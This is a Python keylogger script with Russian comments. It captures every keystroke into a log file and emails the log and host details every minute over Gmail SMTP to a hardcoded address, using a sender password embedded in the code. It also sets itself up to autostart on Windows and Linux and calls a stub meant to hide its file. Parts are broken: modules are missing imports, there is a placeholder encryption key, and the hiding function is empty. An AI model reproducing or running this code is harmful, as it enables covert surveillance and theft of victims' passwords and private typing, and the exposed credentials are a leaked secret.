import subprocess
import sys
import os
import datetime
import keyboard
import smtplib
from email.mime.text import MIMEText
import time
def update_pip():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
    except Exception as e:
        print(f"Ошибка при обновлении pip: {e}")

def install_libraries():
    libraries = ["keyboard", "cryptography"]
    for library in libraries:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        except Exception as e:
            print(f"Ошибка при установке {library}: {e}")

downloads_folder_path = os.path.join(os.path.expanduser("~"), "Downloads")
def hide_file(file_name):
    downloads_folder_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_folder_path, file_name)

if __name__ == "__main__":
    install_libraries()
# Настройка электронной почты
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = "nythnk2001@gmail.com"
SENDER_PASSWORD = "lbyzaakzvtvtwtyp"
RECEIVER_EMAIL = "nythnk2001@gmail.com"

# Настройка шифрования
ENCRYPTION_KEY = b"your_encryption_key"


# Функция для получения информации о системе
def get_system_info():
    return {
        "OS": os.name,
        "Hostname": os.environ.get("COMPUTERNAME"),
        "Username": os.getlogin(),
    }


# Функция для получения IP-адреса
def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "Unknown"
    finally:
        s.close()
    return ip


# Функция для шифрования текста
def encrypt_text(text):
    fernet = Fernet(ENCRYPTION_KEY)
    return fernet.encrypt(text.encode()).decode()


# Функция для расшифровки текста
def decrypt_text(text):
    fernet = Fernet(ENCRYPTION_KEY)
    return fernet.decrypt(text.encode()).decode()


# Функция для записи действий пользователя
def log_action(action):
    with open("log.txt", "a") as f:
        now = datetime.datetime.now()
        f.write(f"{now.strftime('%Y-%m-%d %H:%M:%S')}: {action}\n")

import threading
# Функция для отправки отчета по электронной почте
def send_email_every_minute():
    while True:
        with open("log.txt", "r") as f:
            report_text = f.read()
        subject = "Отчет об отслеживании устройства"
        body = f"""
            **Информация о системе:**

            {get_system_info()}

            **Действия:**

            {report_text}
            """
        message = MIMEText(body, 'plain', 'utf-8')
        send_email(message, report_text, RECEIVER_EMAIL)
        time.sleep(60)  # Отправка отчета каждую минуту

threading.Thread(target=send_email_every_minute).start()
def send_email(message: str,report_text: str, RECEIVER_EMAIL: str):
    subject = "Отчет об отслеживании устройства"
    body = f"""
    **Информация о системе:**

    {get_system_info()}

    **Действия:**

    {report_text}
    """

    message = MIMEText(body, 'plain', 'utf-8')

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message.as_string())
        server.quit()
    except Exception as e:
        print(f"Ошибка при отправке отчета: {e}")
# Функция для определения типа события
def get_event_type(event):
    if event.name == "space":
        return "Пробел"
    elif event.name == "enter":
        return "Ввод"
    elif event.name == "backspace":
        return "Backspace"
    elif len(event.name) == 1:
        return event.name
    else:
        return "Специальная клавиша"


# Функция для обработки нажатий клавиш
def on_press(event):
    event_type = get_event_type(event)
    log_action(event_type)


# Функция для запуска отслеживания


import cryptography.fernet


def autostart():
    if os.name == "nt":
        # Windows
        path_to_bat = os.path.join(os.getenv("APPDATA"), "Microsoft",
                                   "Windows", "Start Menu", "Programs",
                                   "Startup", "autorun.bat")
        with open(path_to_bat, "w") as f:
            f.write(f"@echo off\nstart python {sys.argv[0]}\n")
    else:
        # Linux
        path_to_desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        path_to_autorun = os.path.join(path_to_desktop, "autorun.sh")
        with open(path_to_autorun, "w") as f:
            f.write(f"#!/bin/bash\npython {sys.argv[0]}\n")
        os.chmod(path_to_autorun, 0o755)

log_action("Запуск отслеживания")
hide_file("dekan.py")
keyboard.on_press(on_press)


autostart()

with open("log.txt", "r") as f:
    report_text = f.read()